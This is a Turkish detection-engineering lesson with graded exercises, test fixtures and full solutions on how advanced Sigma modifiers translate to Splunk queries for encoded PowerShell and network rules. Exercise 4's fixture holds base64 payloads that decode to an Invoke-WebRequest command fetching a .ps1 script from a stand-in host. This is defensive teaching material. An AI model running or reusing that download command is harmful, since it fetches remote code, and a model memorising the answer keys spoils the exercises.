---
id: sg22
title: İleri Modifier'lar Gerçek Hedefte · base64offset, wide, windash, cidr, fieldref
summary: SG15'te adı geçen ileri değiştiricilerin gerçek Splunk backend'inde neye dönüştüğü ve gerçek Splunk'ta nasıl davrandığı; PowerShell -enc yükünün UTF-16LE base64 olması ve yalnız base64offset'in onu kaçırması, wide|base64offset; windash ile /enc ve tire benzeri karakterler; cidr ile iç ağ dışı bağlantılar; fieldref'in Splunk'ta harfe duyarlı where'e dönüşmesi; cased'in bu backend'de desteklenmemesi. Gerçek pySigma Splunk backend'i ve gerçek Splunk.
---

::: anlat Değiştirici bir söz verir, backend tutar mı?
Bir değiştirici kuralın **ne** aradığını söyler; **nasıl** aranacağını backend belirler. Aynı kural bir SIEM'de doğru, ötekinde eksik çalışabilir. Bu derste her değiştiricinin Splunk backend'inde ürettiği SPL ölçüldü:

| Değiştirici | Splunk'ta (ölçüldü) |
|---|---|
| `\|base64offset\|contains: 'IEX'` | `CommandLine="*SUVY*" OR CommandLine="*lFW*" OR CommandLine="*JRV*"` |
| `\|wide\|base64offset\|contains: 'IEX'` | `CommandLine="*SQBFAFgA*" OR CommandLine="*kARQBYA*" OR CommandLine="*JAEUAWA*"` |
| `\|windash\|contains: ' -enc '` | `-`, `/`, `–` (en dash), `—` (em dash), `―` için beş seçenek |
| `\|cidr: '10.0.0.0/8'` | `DestinationIp="10.0.0.0/8"` (Splunk bunu ağ olarak eşler) |
| `\|re: 'ab+c'` | `\| regex CommandLine="ab+c"` |
| `\|fieldref: ParentUser` | `\| where 'User'='ParentUser'` |
| `\|cased` | **desteklenmiyor**: çeviri `NotImplementedError` verir |

**Neden üç seçenek?** Base64 üç baytı dört karaktere çevirir. Aranan metin kodlanmış verinin içinde hangi konumda başlarsa (0, 1 ya da 2 bayt kaydırmayla) farklı karakterlere dönüşür. `base64offset` üç olasılığı da arar.

> [!TUZAK] PowerShell'in -enc yükü UTF-16LE'dir
> `powershell -EncodedCommand` (kısaca `-enc`) komutu UTF-8 değil **UTF-16LE** metnin base64'üdür: her harfin ardından bir sıfır baytı gelir. Yalnız `base64offset` UTF-8 kodlamayı varsayar ve gerçek PowerShell yüklerini **kaçırır**. `wide` önce metni UTF-16LE'ye çevirir; doğru zincir `|wide|base64offset|contains`. Bu derste ölçüldü: aynı işaret metni için yalnız `base64offset` yalnız UTF-8 kodlanmış tek olayı buldu, `wide|base64offset` gerçek üç PowerShell yükünü buldu.

> [!NOT] Laboratuvar
> İşaret metni zararsızdır (`Write-Output 'pafta egitim'`). Gerçek kural depolarında aynı teknik kodlanmış komutların içinde `IEX` ya da indirme komutları aramak için kullanılır. Kurallar gerçek pySigma Splunk backend'iyle (`sysmon`, `splunk_windows` pipeline'ları) çevrilir ve gerçek Splunk'ta çalışır.
:::

::: tahmin
Sigma'da dize karşılaştırmaları büyük-küçük harfe **duyarsızdır**. Bu kural, sürecin kullanıcısı (`User`) başlatan sürecin kullanıcısından (`ParentUser`) farklı olan olayları arar. pc-mert'te `User` `PAFTA\mert`, `ParentUser` `pafta\MERT`; pc-zeynep'te `User` `PAFTA\zeynep`, `ParentUser` `NT AUTHORITY\SYSTEM`. Kaç satır gelir?

```sigma
title: Süreç başka bir kullanıcı adına başladı
id: 9b1c2d3e-0000-4000-8000-000000000023
logsource: {product: windows, category: process_creation}
detection:
  sel: {EventID: 1}
  ayni: {User|fieldref: ParentUser}
  condition: sel and not ayni
fields: [Computer, User, ParentUser]
```

???

**İki satır; pc-mert de.**

```
pc-zeynep|PAFTA\zeynep|NT AUTHORITY\SYSTEM
pc-mert|PAFTA\mert|pafta\MERT
```

`fieldref` Splunk'ta `| where 'User'='ParentUser'` olur ve Splunk'ın `where`'i **harfe duyarlıdır**: `PAFTA\mert` ile `pafta\MERT` farklı sayıldı. Sigma'nın anlamına göre bunlar aynı kullanıcıdır; pc-mert bir yanlış alarmdır. Bir değiştiricinin anlamını backend'in koruyup korumadığını hedefte, harf büyüklüğü farklı bir örnekle sınamadan bilemezsin.

```meta
motor: splunk
pipeline: sysmon,splunk_windows
```

```setup
import json
props("pafta_sysmon", {"INDEXED_EXTRACTIONS": "json", "KV_MODE": "none", "TIMESTAMP_FIELDS": "UtcTime",
                       "TIME_FORMAT": "%Y-%m-%d %H:%M:%S"})
WPS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
ISARET = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAYQBmAHQAYQAgAGUAZwBpAHQAaQBtACcA"      # Write-Output 'pafta egitim'
BASKA = "RwBlAHQALQBEAGEAdABlADsAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACcAdABhAG0AYQBtACcA"   # Get-Date; Write-Output 'tamam'
TARIH = "RwBlAHQALQBEAGEAdABlAA=="                                                            # Get-Date
ASCII = "V3JpdGUtT3V0cHV0ICdwYWZ0YSBlZ2l0aW0n"                                                # Write-Output (UTF-8)
surec = [
    ("09:01:00", "pc-ayse", "powershell.exe -nop -enc " + ISARET, "PAFTA\\ayse", "PAFTA\\ayse"),
    ("09:02:00", "pc-can", "powershell.exe /enc " + BASKA, "PAFTA\\can", "PAFTA\\can"),
    ("09:03:00", "pc-mert", "powershell.exe \u2013enc " + ISARET, "PAFTA\\mert", "pafta\\MERT"),
    ("09:04:00", "pc-zeynep", "powershell.exe -enc " + TARIH, "PAFTA\\zeynep", "NT AUTHORITY\\SYSTEM"),
    ("09:05:00", "pc-ali", "powershell.exe -enc " + ASCII, "PAFTA\\ali", "PAFTA\\ali"),
]
ag = [("09:10:00", "pc-ayse", "10.0.5.10"), ("09:11:00", "pc-ayse", "198.51.100.66"),
      ("09:12:00", "pc-can", "192.168.1.20"), ("09:13:00", "pc-can", "172.16.4.4"),
      ("09:14:00", "pc-mert", "172.32.0.1"), ("09:15:00", "pc-mert", "11.0.0.1")]
olaylar = [{"UtcTime": "2026-10-19 " + z, "EventCode": 1, "Computer": c, "Image": WPS, "CommandLine": k,
            "User": u, "ParentUser": pu} for z, c, k, u, pu in surec]
olaylar += [{"UtcTime": "2026-10-19 " + z, "EventCode": 3, "Computer": c, "Image": WPS, "DestinationIp": d,
             "DestinationPort": 443} for z, c, d in ag]
veri("".join(json.dumps(o) + "\n" for o in olaylar), "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")
```
:::

::: gorev 1 · Kodlanmış komutta işaret
Kodlanmış PowerShell komutlarının **içinde** `Write-Output` geçenleri bulan bir kural yaz (`category: process_creation`):

- `Image` `\powershell.exe` ile biter,
- komut satırında ` -enc ` bayrağı **hangi tire biçimiyle** yazılırsa yazılsın (`/enc`, `–enc` dahil),
- komut satırındaki base64 yükü, çözüldüğünde `Write-Output` içerir (PowerShell'in UTF-16LE kodlamasıyla, metnin yükteki konumundan bağımsız).

`fields: [Computer]`.

```starter
title: Kodlanmış komutta işaret
id: 9b1c2d3e-0000-4000-8000-000000000024
logsource: {product: windows, category: process_creation}
detection:
  sel:
    Image|endswith: '\powershell.exe'
    CommandLine|contains: ' -enc '
    CommandLine|base64offset|contains: 'Write-Output'
  condition: sel
fields: [Computer]
```

```test
eq(sorted(r[0] for r in sonuc), ["pc-ayse", "pc-can", "pc-mert"],
   "üç PowerShell yükü: -enc, /enc ve –enc; işaret yükün başında da ortasında da bulunur")
ok(any("SQBFAFgA" not in q and "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA" in q for q in spl), "UTF-16LE (wide) biçimi aranıyor")
EK = ('import json\n'
      'WPS = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"\n'
      'ek = [("pc-uzun", "powershell.exe \\u2014enc " + "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAYQBmAHQAYQAgAGUAZwBpAHQAaQBtACcA"),\n'
      '      ("pc-tarih", "powershell.exe -enc RwBlAHQALQBEAGEAdABlAAo="),\n'
      '      ("pc-duz", "powershell.exe -Command Write-Output pafta")]\n'
      'veri("".join(json.dumps({"UtcTime": "2026-10-19 09:30:00", "EventCode": 1, "Computer": c, "Image": WPS,\n'
      '                         "CommandLine": k}) + "\\n" for c, k in ek), "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")\n')
eq(sorted(r[0] for r in dene(EK)), ["pc-ayse", "pc-can", "pc-mert", "pc-uzun"],
   "em dash (—enc) da yakalanır; işaretsiz yük ve kodlanmamış düz komut yakalanmaz")
```

```solution
title: Kodlanmış komutta işaret
id: 9b1c2d3e-0000-4000-8000-000000000024
logsource: {product: windows, category: process_creation}
detection:
  sel:
    Image|endswith: '\powershell.exe'
    CommandLine|windash|contains: ' -enc '
    CommandLine|wide|base64offset|contains: 'Write-Output'
  condition: sel
fields: [Computer]
```

```hint
Tire biçimleri için `CommandLine|windash|contains: ' -enc '`. Yük için değiştirici zinciri sırasıyla: `CommandLine|wide|base64offset|contains: 'Write-Output'` (önce UTF-16LE, sonra base64'ün üç kaydırması, sonra içerir).
```

```meta
motor: splunk
pipeline: sysmon,splunk_windows
```

```setup
import json
props("pafta_sysmon", {"INDEXED_EXTRACTIONS": "json", "KV_MODE": "none", "TIMESTAMP_FIELDS": "UtcTime",
                       "TIME_FORMAT": "%Y-%m-%d %H:%M:%S"})
WPS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
ISARET = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAYQBmAHQAYQAgAGUAZwBpAHQAaQBtACcA"      # Write-Output 'pafta egitim'
BASKA = "RwBlAHQALQBEAGEAdABlADsAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACcAdABhAG0AYQBtACcA"   # Get-Date; Write-Output 'tamam'
TARIH = "RwBlAHQALQBEAGEAdABlAA=="                                                            # Get-Date
ASCII = "V3JpdGUtT3V0cHV0ICdwYWZ0YSBlZ2l0aW0n"                                                # Write-Output (UTF-8)
surec = [
    ("09:01:00", "pc-ayse", "powershell.exe -nop -enc " + ISARET, "PAFTA\\ayse", "PAFTA\\ayse"),
    ("09:02:00", "pc-can", "powershell.exe /enc " + BASKA, "PAFTA\\can", "PAFTA\\can"),
    ("09:03:00", "pc-mert", "powershell.exe \u2013enc " + ISARET, "PAFTA\\mert", "pafta\\MERT"),
    ("09:04:00", "pc-zeynep", "powershell.exe -enc " + TARIH, "PAFTA\\zeynep", "NT AUTHORITY\\SYSTEM"),
    ("09:05:00", "pc-ali", "powershell.exe -enc " + ASCII, "PAFTA\\ali", "PAFTA\\ali"),
]
ag = [("09:10:00", "pc-ayse", "10.0.5.10"), ("09:11:00", "pc-ayse", "198.51.100.66"),
      ("09:12:00", "pc-can", "192.168.1.20"), ("09:13:00", "pc-can", "172.16.4.4"),
      ("09:14:00", "pc-mert", "172.32.0.1"), ("09:15:00", "pc-mert", "11.0.0.1")]
olaylar = [{"UtcTime": "2026-10-19 " + z, "EventCode": 1, "Computer": c, "Image": WPS, "CommandLine": k,
            "User": u, "ParentUser": pu} for z, c, k, u, pu in surec]
olaylar += [{"UtcTime": "2026-10-19 " + z, "EventCode": 3, "Computer": c, "Image": WPS, "DestinationIp": d,
             "DestinationPort": 443} for z, c, d in ag]
veri("".join(json.dumps(o) + "\n" for o in olaylar), "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")
```
:::

::: gorev 2 · İç ağın dışına çıkan PowerShell
PowerShell'in ağ bağlantılarından (`category: network_connection`) hedefi kurumun iç ağlarında **olmayanları** bul. İç ağlar: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`. `fields: [Computer, DestinationIp]`.

```starter
title: İç ağ dışına PowerShell bağlantısı
id: 9b1c2d3e-0000-4000-8000-000000000025
logsource: {product: windows, category: network_connection}
detection:
  sel:
    Image|endswith: '\powershell.exe'
  ic:
    DestinationIp|startswith: ['10.', '172.16.', '192.168.']
  condition: sel and not ic
fields: [Computer, DestinationIp]
```

```test
eq(sutunlar, ["Computer", "DestinationIp"], "sütunlar")
eq(sorted(r[1] for r in sonuc), ["11.0.0.1", "172.32.0.1", "198.51.100.66"],
   "172.32.0.1 iç ağ değildir (172.16.0.0/12 → 172.16–172.31); 11.0.0.1 de dışarıda")
ok(any("172.16.0.0/12" in q for q in spl), "cidr değiştiricisi")
EK = ('import json\n'
      'WPS = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"\n'
      'ek = [("pc-x", "172.31.255.254"), ("pc-x", "192.169.0.1"), ("pc-x", "10.255.255.255")]\n'
      'veri("".join(json.dumps({"UtcTime": "2026-10-19 09:40:00", "EventCode": 3, "Computer": c, "Image": WPS,\n'
      '                         "DestinationIp": d}) + "\\n" for c, d in ek), "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")\n')
eq(sorted(r[1] for r in dene(EK)), ["11.0.0.1", "172.32.0.1", "192.169.0.1", "198.51.100.66"],
   "ağların son adresleri içeridedir; 192.169.0.1 dışarıdadır")
```

```solution
title: İç ağ dışına PowerShell bağlantısı
id: 9b1c2d3e-0000-4000-8000-000000000025
logsource: {product: windows, category: network_connection}
detection:
  sel:
    Image|endswith: '\powershell.exe'
  ic:
    DestinationIp|cidr: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']
  condition: sel and not ic
fields: [Computer, DestinationIp]
```

```hint
`startswith: '172.16.'` yalnız 172.16.x'i iç ağ sayar; oysa 172.16.0.0/12 172.16'dan 172.31'e kadardır ve aradakiler dışarıda görünür. Ağ üyeliği için `DestinationIp|cidr: [...]`.
```

```meta
motor: splunk
pipeline: sysmon,splunk_windows
```

```setup
import json
props("pafta_sysmon", {"INDEXED_EXTRACTIONS": "json", "KV_MODE": "none", "TIMESTAMP_FIELDS": "UtcTime",
                       "TIME_FORMAT": "%Y-%m-%d %H:%M:%S"})
WPS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
ISARET = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAYQBmAHQAYQAgAGUAZwBpAHQAaQBtACcA"      # Write-Output 'pafta egitim'
BASKA = "RwBlAHQALQBEAGEAdABlADsAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACcAdABhAG0AYQBtACcA"   # Get-Date; Write-Output 'tamam'
TARIH = "RwBlAHQALQBEAGEAdABlAA=="                                                            # Get-Date
ASCII = "V3JpdGUtT3V0cHV0ICdwYWZ0YSBlZ2l0aW0n"                                                # Write-Output (UTF-8)
surec = [
    ("09:01:00", "pc-ayse", "powershell.exe -nop -enc " + ISARET, "PAFTA\\ayse", "PAFTA\\ayse"),
    ("09:02:00", "pc-can", "powershell.exe /enc " + BASKA, "PAFTA\\can", "PAFTA\\can"),
    ("09:03:00", "pc-mert", "powershell.exe \u2013enc " + ISARET, "PAFTA\\mert", "pafta\\MERT"),
    ("09:04:00", "pc-zeynep", "powershell.exe -enc " + TARIH, "PAFTA\\zeynep", "NT AUTHORITY\\SYSTEM"),
    ("09:05:00", "pc-ali", "powershell.exe -enc " + ASCII, "PAFTA\\ali", "PAFTA\\ali"),
]
ag = [("09:10:00", "pc-ayse", "10.0.5.10"), ("09:11:00", "pc-ayse", "198.51.100.66"),
      ("09:12:00", "pc-can", "192.168.1.20"), ("09:13:00", "pc-can", "172.16.4.4"),
      ("09:14:00", "pc-mert", "172.32.0.1"), ("09:15:00", "pc-mert", "11.0.0.1")]
olaylar = [{"UtcTime": "2026-10-19 " + z, "EventCode": 1, "Computer": c, "Image": WPS, "CommandLine": k,
            "User": u, "ParentUser": pu} for z, c, k, u, pu in surec]
olaylar += [{"UtcTime": "2026-10-19 " + z, "EventCode": 3, "Computer": c, "Image": WPS, "DestinationIp": d,
             "DestinationPort": 443} for z, c, d in ag]
veri("".join(json.dumps(o) + "\n" for o in olaylar), "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")
```
:::

::: anlat re, fieldref ve UTF-16'nın iki ucu: bu sürümde ölçülen
Üç değiştiricinin Splunk karşılığı (pySigma 1.5.1, Splunk backend 2.1.0, bu derste ölçüldü):

| Sigma | Splunk | Dikkat |
|---|---|---|
| `CommandLine\|re: '...'` | `\| regex CommandLine="..."` | Arama değil sonradan süzme; desen PCRE. `\|re\|i` başa `(?i)` koyar. Literal bir UTF-8 karakter (–) sınıf içinde çalışır. |
| `User\|fieldref: ParentUser` | `\| where 'User'='ParentUser'` | `where` **harfe duyarlıdır**: `PAFTA\mert` ile `pafta\MERT` farklı sayılır. |
| `\|wide\|base64offset` | UTF-16LE + üç base64 kaydırması | PowerShell `-enc` yükü UTF-16LE'dir. |
| `\|utf16be\|base64offset` | UTF-16BE kalıpları | Başka bir kodlama; LE yükünü yakalamaz. |
| `\|utf16le` | **hata**: "Unknown modifier 'utf16le'" | Şartnamede geçen ad bu pySigma'da yok; küçük-endian için `wide` yaz. |

Bir kuralı başka depodan alırken önce çevir ve gerçek veriyle sına. Bilinmeyen değiştirici açık hata verir; harfe duyarlı karşılaştırma ise hata vermeden fazla ya da eksik sonuç üretir.
:::

::: gorev 3 · Kodlanmış PowerShell, kullanıcısı üst süreçten farklı
Hazırlıktaki Sysmon süreç olaylarında şu PowerShell süreçlerini bulan bir kural yaz (`category: process_creation`):

- `Image` `\powershell.exe` ile biter;
- komut satırında **düzenli ifadeyle** (`re`): bir boşluk, ardından `-`, `/` ya da `–` (en dash), `enc`, bir ya da daha çok boşluk ve **en az 16** base64 karakteri (`A-Za-z0-9+/=`);
- süreci başlatan kullanıcı (`User`) üst sürecin kullanıcısıyla (`ParentUser`) **aynı değil** (`fieldref`).

`fields: [Computer, User, ParentUser]`.

```starter
title: Kodlanmış PowerShell, farklı kullanıcı
id: 9b1c2d3e-0000-4000-8000-000000000026
logsource: {product: windows, category: process_creation}
detection:
  sel:
    Image|endswith: '\powershell.exe'
    CommandLine|contains: ' -enc '
  condition: sel
fields: [Computer, User, ParentUser]
```

```test
eq(sorted(r[0] for r in sonuc), ["pc-mert", "pc-zeynep"],
   "zeynep: SYSTEM'in başlattığı kullanıcı süreci; mert: where harfe duyarlı, PAFTA\\mert ile pafta\\MERT farklı sayılır")
ok(any("| regex CommandLine=" in q for q in spl) and any("where" in q and "'User'='ParentUser'" in q for q in spl),
   "re → | regex, fieldref → | where 'User'='ParentUser'", spl)
EK = ('import json\n'
      'ek = [("pc-kisa", "powershell.exe -enc QQBCAEMA", "PAFTA\\\\x", "PAFTA\\\\y"),\n'
      '      ("pc-uzun", "powershell.exe -enc  " + ISARET, "PAFTA\\\\x", "PAFTA\\\\y"),\n'
      '      ("pc-on", "powershell.exe-enc " + ISARET, "PAFTA\\\\x", "PAFTA\\\\y"),\n'
      '      ("pc-ayni", "powershell.exe /enc " + ISARET, "PAFTA\\\\x", "PAFTA\\\\x"),\n'
      '      ("pc-isaret", "powershell.exe -enc QQ+/QQ+/QQ+/QQ+/QQ==", "PAFTA\\\\x", "PAFTA\\\\y")]\n'
      'veri("".join(json.dumps({"UtcTime": "2026-10-19 09:40:00", "EventCode": 1, "Computer": c, "Image": WPS,\n'
      '                         "CommandLine": k, "User": u, "ParentUser": p}) + "\\n" for c, k, u, p in ek),\n'
      '     "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")\n')
eq(sorted(r[0] for r in dene(EK)), ["pc-isaret", "pc-mert", "pc-uzun", "pc-zeynep"],
   "16'dan kısa yük yakalanmaz; çift boşluk ve +/ içeren yük yakalanır; bayraktan önce boşluk yoksa ya da kullanıcı aynıysa yakalanmaz")
```

```solution
title: Kodlanmış PowerShell, farklı kullanıcı
id: 9b1c2d3e-0000-4000-8000-000000000026
logsource: {product: windows, category: process_creation}
detection:
  sel:
    Image|endswith: '\powershell.exe'
    CommandLine|re: '\s[-/–]enc\s+[A-Za-z0-9+/=]{16,}'
  ayni:
    User|fieldref: ParentUser
  condition: sel and not ayni
fields: [Computer, User, ParentUser]
```

```hint
`CommandLine|re: '\s[-/–]enc\s+[A-Za-z0-9+/=]{16,}'`; tek tırnaklı YAML metninde ters bölü olduğu gibi kalır. Kullanıcı karşılaştırması ayrı bir seçim olsun (`ayni: {User|fieldref: ParentUser}`) ve koşul `sel and not ayni`.
```

```meta
motor: splunk
pipeline: sysmon,splunk_windows
```

```setup
import json
props("pafta_sysmon", {"INDEXED_EXTRACTIONS": "json", "KV_MODE": "none", "TIMESTAMP_FIELDS": "UtcTime",
                       "TIME_FORMAT": "%Y-%m-%d %H:%M:%S"})
WPS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
ISARET = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAYQBmAHQAYQAgAGUAZwBpAHQAaQBtACcA"
BASKA = "RwBlAHQALQBEAGEAdABlADsAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACcAdABhAG0AYQBtACcA"
TARIH = "RwBlAHQALQBEAGEAdABlAA=="
ASCII = "V3JpdGUtT3V0cHV0ICdwYWZ0YSBlZ2l0aW0n"
surec = [
    ("09:01:00", "pc-ayse", "powershell.exe -nop -enc " + ISARET, "PAFTA\\ayse", "PAFTA\\ayse"),
    ("09:02:00", "pc-can", "powershell.exe /enc " + BASKA, "PAFTA\\can", "PAFTA\\can"),
    ("09:03:00", "pc-mert", "powershell.exe \u2013enc " + ISARET, "PAFTA\\mert", "pafta\\MERT"),
    ("09:04:00", "pc-zeynep", "powershell.exe -enc " + TARIH, "PAFTA\\zeynep", "NT AUTHORITY\\SYSTEM"),
    ("09:05:00", "pc-ali", "powershell.exe -enc " + ASCII, "PAFTA\\ali", "PAFTA\\ali"),
    ("09:06:00", "pc-deniz", "powershell.exe -Command Get-Date", "PAFTA\\deniz", "NT AUTHORITY\\SYSTEM"),
]
veri("".join(json.dumps({"UtcTime": "2026-10-19 " + z, "EventCode": 1, "Computer": c, "Image": WPS, "CommandLine": k,
                         "User": u, "ParentUser": pu}) + "\n" for z, c, k, u, pu in surec),
     "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")
```
:::

::: gorev 4 · Aynı metin, iki bayt sırası
Bir zararlının yapılandırma aracı `-cfg` ile base64 kodlu bir metin alıyor. Kimi sürüm metni UTF-16LE, kimi UTF-16BE ile kodluyor. Çözüldüğünde `Invoke-WebRequest` içeren yükü **iki bayt sırasında da** ve yükteki konumundan bağımsız yakalayan bir kural yaz (`category: process_creation`; `Image` `\cfgtool.exe` ile biter). UTF-8 ile kodlanmış aynı metin bu aracın biçimi değil, yakalanmasın. `fields: [Computer]`.

```starter
title: İki bayt sırasında yük
id: 9b1c2d3e-0000-4000-8000-000000000027
logsource: {product: windows, category: process_creation}
detection:
  sel:
    Image|endswith: '\cfgtool.exe'
    CommandLine|base64offset|contains: 'Invoke-WebRequest'
  condition: sel
fields: [Computer]
```

```test
eq(sorted(r[0] for r in sonuc), ["pc-be", "pc-le", "pc-orta"],
   "UTF-16LE ve UTF-16BE yükü, metnin ortasındaki işaret dahil yakalanır; UTF-8 ve başka metin yakalanmaz")
ok(any("SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0A" in q or "kAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdA" in q for q in spl)
   and any("AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAd" in q for q in spl), "iki bayt sırasının kalıpları da sorguda", spl)
try:
    cevir(src.replace("|wide|", "|utf16le|"))
    bilinmeyen = "çevrildi"
except Exception as e:
    bilinmeyen = (getattr(e, "info", None) or {}).get("msg", str(e))
ok("utf16le" in bilinmeyen, "bu pySigma sürümünde utf16le bilinmeyen değiştirici; küçük-endian için wide", bilinmeyen)
```

```solution
title: İki bayt sırasında yük
id: 9b1c2d3e-0000-4000-8000-000000000027
logsource: {product: windows, category: process_creation}
detection:
  sel:
    Image|endswith: '\cfgtool.exe'
  le:
    CommandLine|wide|base64offset|contains: 'Invoke-WebRequest'
  be:
    CommandLine|utf16be|base64offset|contains: 'Invoke-WebRequest'
  condition: sel and (le or be)
fields: [Computer]
```

```hint
Tek seçimde iki farklı kodlama zinciri olmaz; `le` ve `be` diye iki seçim yaz ve koşulu `sel and (le or be)` yap. Küçük-endian için `wide`, büyük-endian için `utf16be`; ikisinin de ardından `base64offset|contains`.
```

```meta
motor: splunk
pipeline: sysmon,splunk_windows
```

```setup
import json
props("pafta_sysmon", {"INDEXED_EXTRACTIONS": "json", "KV_MODE": "none", "TIMESTAMP_FIELDS": "UtcTime",
                       "TIME_FORMAT": "%Y-%m-%d %H:%M:%S"})
ARAC = "C:\\ProgramData\\Kurum\\cfgtool.exe"
yuk = [("pc-le", "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AOQAvAGEALgBwAHMAMQA="),
       ("pc-be", "AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBhAC4AcABzADE="),
       ("pc-orta", "JAB1AD0AMQA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AOQAvAGIA"),
       ("pc-utf8", "SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovLzE5OC41MS4xMDAuOS9hLnBzMQ=="),
       ("pc-baska", "RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcA")]
veri("".join(json.dumps({"UtcTime": "2026-10-19 10:00:00", "EventCode": 1, "Computer": c, "Image": ARAC,
                         "CommandLine": "cfgtool.exe -cfg " + b}) + "\n" for c, b in yuk),
     "pafta_sysmon", "WinEventLog:Microsoft-Windows-Sysmon/Operational")
```
:::
